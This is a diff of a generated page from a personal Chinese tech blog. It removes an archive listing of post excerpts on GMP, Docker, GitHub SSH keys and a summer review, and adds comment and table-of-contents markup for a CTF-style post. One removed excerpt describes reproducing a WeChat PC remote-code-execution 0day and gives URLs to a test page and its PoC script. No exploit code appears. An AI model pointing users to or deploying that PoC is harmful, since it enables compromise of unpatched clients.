-GMP是一个用于任意精度算术的免费库，可处理带符号整数，有理数和浮点数。除了运行GMP机器中的可用内存所暗示的精度外，对精度没有实际限制。GMP具有丰富的功能集，并且这些功能具有常规接口。
-GMP的主要目标应用程序是密码学应用程序和研究，Internet安全应用程序，代数系统，计算代数研究等
-GMP经过精心设计，无论是小型操作数还是大型操作数，都应尽可能快。通过使用全字作为基本算术类型，使用快速算法，针对...
-            </div>
-            <!-- read more -->
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/09/14</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="linux">linux</a>
-    
-</div>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/2020-summer/">
-                
-                <span class="abstract-title-text">2020 Summer Review of xiabee</span>
-            </a>
-            <div class="abstract-content">
-                有人问我最喜欢哪个季节，我觉得大概是夏季——夏季总有一些特殊的回忆：
 
-今年的我度过了一次最长的夏天——准确的来说应该是最长的假期
-0x00 前言这是我读书生涯开始以后，第一个超过六个月的“假期”……疫情宅家，几乎就没干成啥事，flag立了一堆，真正实现的貌似…….妹有吧（划掉
-来莽一眼我5月23日在popi里面的flag：“考完试想干啥”
+            <!-- utteranc评论 -->
 
-好多想干的事情呢。
-考完当即大概是吃吃吃，和cc约了吨火锅，（突然发现输入法挺懂我），然后吃完火锅可能会再约几局，把最近少吃的垃圾食品全部补会来(啊巴斯……可能会去探索一下新的吃货打卡地点√
-然后抓紧时间练车车，票圈一个个老司机横空出世，本弟弟才开...
-            </div>
-            <!-- read more -->
+    <script src='https://utteranc.es/client.js'
+        repo='xiabee/xiabee.github.io'
+        issue-term='title'
+        label='Comment'
+        theme='github-light'
+        crossorigin='anonymous'
+        async>
+    </script>
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/09/05</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="碎碎念">碎碎念</a>
-    
-</div>
-
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/github-ssh/">
-                
-                <span class="abstract-title-text">GitHub配置SSH Key</span>
-            </a>
-            <div class="abstract-content">
-                在Github上提交代码，每次 push 都需要输入一次密码，特别麻烦，所以现在就记录一下用SSH登陆GitHub的过程
-先来康康这两个登陆方式有啥区别：
-1234https://github.com/xiabee/fucking-views.git# use httpsgit@github.com:xiabee/fucking-views.git# use ssh
 
-第一种直接使用https，可以直接浏览器访问，方便查阅，但是每次push都要输入密码
-第二种使用ssh，不能直接访问，但是在push的时候可以保留密钥文件
-个人感觉，在开发的时候，还是使用ssh比较方便。
-那就康康如何配置...
-            </div>
-            <!-- read more -->
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/08/27</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
+
+        </div>
     
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="git">git</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ssh">ssh</a>
-    
-</div>
-
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/wechat-0day/">
-                
-                <span class="abstract-title-text">微信RCE 0day复现</span>
-            </a>
-            <div class="abstract-content">
-                0xFF 免责声明由于传播、利用此文提供的信息而造成的任何直接或间接的后果，均有使用者承担，本站不为此承担任何责任。
-太长不看版：(2021年4月17日的0day漏洞)
-3.2.1.132及之前版本的PC版微信有安全漏洞，通过微信内置浏览器点击恶意链接，即可实现任意命令执行（RCE）
-
-测试链接：http://xiabee.cn:9999/
-
-POC源码：http://xiabee.cn:9999/poc.js
-
-
-以上测试为打开Windows系统（64位机）内置计算器
-
-
-
-RCE(Remote command/code execute)漏洞，可以让攻击者直接向后台服务器远程注入操作系...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/18</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="0day">0day</a>
-    
-</div>
-
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/docker-sudo/">
-                
-                <span class="abstract-title-text">不输入sudo运行Docker</span>
-            </a>
-            <div class="abstract-content">
-                docker对权限要求较高，需要sudo权限才能运行，但是每次敲命令都加sudo就显得很累赘，这里有个化简办法：将用户加入docker组，实现不加sudo执行docker命令
-查看docker组查看/etc/group,确定是否存在docker组
-1cat /etc/group | grep docker
-
-安装Docker后，docker组已经创建好了，所以上面命令的输出为： docker:x:120:ubuntu 
-
-将当前用户添加到 docker 组1sudo gpasswd -a $&#123;USER&#125; docker
-
-重新登录或切换到docker组12345newg...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/19</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="docker">docker</a>
-    
-</div>
-
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/docker-commands/">
-                
-                <span class="abstract-title-text">Docker常用命令</span>
-            </a>
-            <div class="abstract-content">
-                 运行docker时，发现权限不足可以康康这个：不输入sudo运行docker 
-1.查看docker容器信息123docker --help    #查看docker容器帮助docker version   #查看docker容器版本docker info      #查看docker容器信息
-
-
-2.镜像查看1234567docker images     #列出本地imagesdocker images -a  #含中间映像层docker images -q  #只显示镜像IDdocker images -qa #含中间映像层  docker images --digests  #...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/18</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="docker">docker</a>
-    
-</div>
-
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/docker-source/">
-                
-                <span class="abstract-title-text">Docker换源</span>
-            </a>
-            <div class="abstract-content">
-                Docker相关
-Docker入门
-
-Docker常用命令
-
-Docker解决sudo
-
-
-Docker换源由于众所周知的原因，国内的访问docker源时会比较慢，所以我们换源到国内镜像站上。
-这里依然以Ubuntu为例。
-腾讯源
-官方文档
-
-
-具体操作：
-创建加速器文件
-12/etc/docker/daemon.jsonvim /etc/docker/daemon.json
-
-
-
-按i切换至编辑模式，在daemon.json中添加以下内容，并保存（ESC；输入:进入命令模式；q保存并退出）
-12345&#123;&quot;registry-mirrors&quot;: [ &quot...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/17</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="docker">docker</a>
-    
-</div>
-
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/docker-pupy/">
-                
-                <span class="abstract-title-text">Docker入门</span>
-            </a>
-            <div class="abstract-content">
-                Docker简介
-官方文档
-
-简言之：开源的、跨平台的、虚拟化的应用引擎；使用沙箱机制。
-
-一个完整的Docker通常会包括以下几个部分：
-
-DockerClient 客户端
-Docker Daemon守护进程
-Docker Image镜像
-DockerContainer容器 
-
-
-
-
-Docker与VM可能很多朋友都用过虚拟机，而对容器这个概念比较的陌生——简单来说，可以理解为：相较于VM，docker是轻量级的虚拟化技术，却有着更强大的性能。
-虚拟机（VM）
-我们用的传统虚拟机如 VMware ， virtualbox之类的需要模拟整台机器包括硬件。
-每台虚拟机都需要有自己的操作系统...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/17</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="docker">docker</a>
-    
-</div>
-
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-    <!-- paginator  -->
-    
-        <nav class="page-nav">
-            <span class="page-number current">1</span><a class="page-number" href="/archives/2020/page/2/">2</a><a class="extend next" rel="next" href="/archives/2020/page/2/">NEXT &gt;</a>
-        </nav>
+    <!-- Mathjax -->
     
 </main>
 
@@ -1029,6 +868,23 @@ Docker与VM可能很多朋友都用过虚拟机，而对容器这个概念比较
 
         </div>
         <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E9%9D%B6%E6%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">搭建靶机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">修改域名解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-FLAG"><span class="toc-number">5.</span> <span class="toc-text">寻找 FLAG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FLAG1"><span class="toc-number">5.1.</span> <span class="toc-text">FLAG1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FLAG2"><span class="toc-number">5.2.</span> <span class="toc-text">FLAG2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FLAG3"><span class="toc-number">5.3.</span> <span class="toc-text">FLAG3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FLAG4"><span class="toc-number">5.4.</span> <span class="toc-text">FLAG4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final-FLAG"><span class="toc-number">5.5.</span> <span class="toc-text">Final FLAG</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">小结</span></a></li></ol>
+            </div>
         
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
@@ -2295,6 +2151,8 @@ Docker与VM可能很多朋友都用过虚拟机，而对容器这个概念比较
         <!-- CNZZ -->
         
         <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
         
         <!-- mermaid -->
         
